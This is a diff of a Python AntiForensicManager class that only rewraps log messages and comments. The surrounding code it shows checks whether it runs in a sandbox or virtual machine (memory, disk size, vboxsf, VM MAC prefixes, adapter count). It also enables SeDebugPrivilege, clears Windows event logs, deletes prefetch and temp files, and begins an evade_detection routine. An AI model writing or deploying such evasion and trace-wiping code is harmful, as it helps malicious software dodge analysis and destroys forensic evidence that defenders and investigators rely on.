@@ -96,7 +96,8 @@ class AntiForensicManager:
         psutil = _psutil_or_none()
         if psutil is None:
             logger.warning(
-                "Sandbox process check skipped: psutil not installed (pip install psutil for full checks)."
+                "Sandbox process check skipped: psutil not installed "
+                "(pip install psutil for full checks)."
             )
             return False
         try:
@@ -181,7 +182,8 @@ class AntiForensicManager:
             threshold_gb = 3.5
             if total_memory_gb < threshold_gb:
                 logger.debug(
-                    f"Low total memory detected: {total_memory_gb:.2f} GB (Threshold: < {threshold_gb} GB)"
+                    f"Low total memory detected: {total_memory_gb:.2f} GB "
+                    f"(Threshold: < {threshold_gb} GB)"
                 )
                 return True
         except psutil.Error as e:
@@ -229,7 +231,8 @@ class AntiForensicManager:
             threshold_gb = 100
             if total_disk_gb < threshold_gb:
                 logger.debug(
-                    f"Low total disk size for root partition detected: {total_disk_gb:.2f} GB (Threshold: < {threshold_gb} GB)"
+                    f"Low total disk size for root partition detected: "
+                    f"{total_disk_gb:.2f} GB (Threshold: < {threshold_gb} GB)"
                 )
                 return True
 
@@ -238,7 +241,8 @@ class AntiForensicManager:
                 # Use case-insensitive check for file system type
                 if partition.fstype and partition.fstype.lower() in ["vboxsf"]:
                     logger.debug(
-                        f"VM-specific file system type detected: {partition.fstype} on {partition.device}"
+                        "VM-specific file system type detected: "
+                        f"{partition.fstype} on {partition.device}"
                     )
                     return True
         except FileNotFoundError:
@@ -276,7 +280,8 @@ class AntiForensicManager:
                             mac = snic.address.lower()
                             if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                                 logger.debug(
-                                    f"VM-specific MAC address prefix found: {mac} on interface {name}"
+                                    "VM-specific MAC address prefix found: "
+                                    f"{mac} on interface {name}"
                                 )
                                 vm_mac_found = True
                                 break  # Found VM MAC on this interface
@@ -290,7 +295,8 @@ class AntiForensicManager:
             threshold_adapters = 1
             if adapter_count <= threshold_adapters:
                 logger.debug(
-                    f"Low network adapter count detected: {adapter_count} non-loopback (Threshold: <= {threshold_adapters})"
+                    f"Low network adapter count detected: {adapter_count} non-loopback "
+                    f"(Threshold: <= {threshold_adapters})"
                 )
                 return True
 
@@ -307,14 +313,16 @@ class AntiForensicManager:
         Requires appropriate privileges (typically Administrator).
 
         Args:
-            pid (Optional[int]): Process ID to target. Defaults to the current process (os.getpid()).
+            pid (Optional[int]): Process ID to target. Defaults to the current process
+                (``os.getpid()``).
 
         Returns:
             bool: True if privilege adjustment was attempted successfully, False otherwise.
         """
         target_pid = pid or os.getpid()
         logger.warning(
-            f"hide_process (PID: {target_pid}) is Windows-specific and only attempts to enable SeDebugPrivilege. It does not truly hide the process and requires elevation."
+            f"hide_process (PID: {target_pid}) is Windows-specific and only attempts to enable "
+            "SeDebugPrivilege. It does not truly hide the process and requires elevation."
         )
 
         if not self.is_windows:
@@ -324,14 +332,15 @@ class AntiForensicManager:
         process_handle = None
         token_handle = None
         try:
-            # Get handle to the specified process (PROCESS_QUERY_INFORMATION is sufficient to get the token)
+            # Get handle to the process (PROCESS_QUERY_INFORMATION is enough for the token)
             process_handle = win32api.OpenProcess(
                 win32con.PROCESS_QUERY_INFORMATION, False, target_pid
             )
 
             # Open the process token with required privileges for adjustment
             token_handle = win32security.OpenProcessToken(
-                process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
+                process_handle,
+                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
             )
 
             # Lookup the LUID for SeDebugPrivilege
@@ -353,13 +362,15 @@ class AntiForensicManager:
             elif last_error == win32con.ERROR_NOT_ALL_ASSIGNED:
                 # This is the expected error if the user lacks the privilege (e.g., not admin)
                 logger.warning(
-                    f"Could not enable SeDebugPrivilege for PID {target_pid} (Requires elevation / privilege not held). Error: {last_error}"
+                    f"Could not enable SeDebugPrivilege for PID {target_pid} "
+                    f"(Requires elevation / privilege not held). Error: {last_error}"
                 )
                 return False  # Indicate privilege was not assigned
             else:
                 # Other unexpected errors
                 logger.error(
-                    f"Failed to adjust token privileges for PID {target_pid}. Error code: {last_error}"
+                    f"Failed to adjust token privileges for PID {target_pid}. "
+                    f"Error code: {last_error}"
                 )
                 return False
 
@@ -443,7 +454,12 @@ class AntiForensicManager:
                             logger.debug(f"Successfully cleared '{log_name}' event log.")
                             cleared_any_log = True
                         else:
-                            error_msg = f"Failed to clear '{log_name}' event log. RC: {process.returncode}. Stderr: {process.stderr.strip()}. Stdout: {process.stdout.strip()}"
+                            stderr = process.stderr.strip()
+                            stdout = process.stdout.strip()
+                            error_msg = (
+                                f"Failed to clear '{log_name}' event log. "
+                                f"RC: {process.returncode}. Stderr: {stderr}. Stdout: {stdout}"
+                            )
                             if process.returncode == 5:  # Access Denied
                                 logger.warning(f"{error_msg} (Requires elevation).")
                             else:
@@ -476,11 +492,13 @@ class AntiForensicManager:
                         try:
                             if os.path.isfile(file_path):
                                 os.remove(file_path)
-                                # logger.debug(f"Removed prefetch file: {filename}") # Can be very verbose
+                                # logger.debug(f"Removed prefetch file: {filename}")
+                                # (can be very verbose)
                                 cleared_any_prefetch = True
                         except OSError as e:  # Catch permission errors etc.
                             logger.warning(
-                                f"Could not remove prefetch file '{filename}': {e} (Requires elevation?)."
+                                f"Could not remove prefetch file '{filename}': {e} "
+                                "(Requires elevation?)."
                             )
                             failed_any_prefetch = True
                         except Exception as e:
@@ -518,7 +536,8 @@ class AntiForensicManager:
 
         cleared_any_temp = False
         failed_any_temp = False
-        processed_dirs = set()  # Avoid processing same path twice if TEMP and TMP point to same loc
+        # Avoid processing same path twice if TEMP and TMP point to same location
+        processed_dirs = set()
 
         for temp_dir in temp_dirs_to_check:
             if temp_dir and os.path.isdir(temp_dir) and temp_dir not in processed_dirs:
@@ -535,11 +554,11 @@ class AntiForensicManager:
                                     security.secure_delete(item_path)
                                 else:
                                     os.remove(item_path)
-                                # logger.debug(f"Removed temp item: {item_path}") # Verbose
+                                # logger.debug(f"Removed temp item: {item_path}")  # verbose
                                 cleared_any_temp = True
                             elif os.path.isdir(item_path):
-                                # Skipping directory removal by default for safety
-                                # Consider adding recursive delete (shutil.rmtree) if desired, USE WITH EXTREME CAUTION
+                                # Skipping directory removal by default for safety.
+                                # Recursive delete (shutil.rmtree) possible but dangerous.
                                 pass
                         except OSError as e:
                             logger.warning(f"Could not remove temp item '{item_path}': {e}")
@@ -566,7 +585,8 @@ class AntiForensicManager:
             logger.warning(
                 "Trace clearing finished with one or more non-fatal errors or permission issues."
             )
-        return overall_success  # Returns True if major steps attempted, False if fundamental errors occurred
+        # True if major steps attempted; False if fundamental errors occurred
+        return overall_success
 
     def evade_detection(self) -> Dict[str, bool]:
         """
